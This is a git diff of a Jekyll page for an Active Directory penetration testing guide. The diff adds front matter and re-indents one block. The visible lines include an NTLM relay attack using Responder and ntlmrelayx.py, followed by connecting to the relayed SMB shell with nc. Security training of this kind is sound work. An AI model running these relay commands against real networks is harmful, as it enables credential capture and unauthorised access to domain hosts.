@@ -1,3 +1,19 @@
+---
+layout: default
+title: AD
+description:
+img: assets/img/pentest/h4Ck/mixNumbers.png
+importance: 2
+category: Linux
+tag: pentesting
+discus_comments: true
+comments: true
+toc:
+  sidebar: left
+related_posts: true
+news: true
+---
+
 # Active Directory (AD) Penetration Testing Guide
 
 This document provides a comprehensive guide to penetration testing within Active Directory environments. It covers essential topics such as common AD ports and services, various tools and techniques for exploitation, and methods for post-compromise attacks. Each section details specific tools like Responder, Impacket, and Mimikatz, along with practical examples and usage scenarios. Additionally, it includes advanced topics on token impersonation, hash cracking, and domain enumeration. This guide aims to equip security professionals with the knowledge and tools needed to effectively assess and secure AD infrastructures.
@@ -206,10 +222,10 @@ meterpreter> rev2self # to reverse impersonationation process, not important com
     ```
   * Attack 2
     `bash
-    responder -I eth0 -rdwv
-    ntlmrelayx.py -tf targets.txt -smb2support -i # It will show SMB shell opned on port {PORT}
-    nc 127.0.0.1 {PORT}
-    `
+responder -I eth0 -rdwv
+ntlmrelayx.py -tf targets.txt -smb2support -i # It will show SMB shell opned on port {PORT}
+nc 127.0.0.1 {PORT}
+`
     SHELL command `shares` to get shares name and `use SHARENAME$` to get access.
   * Attack 3
     ```bash
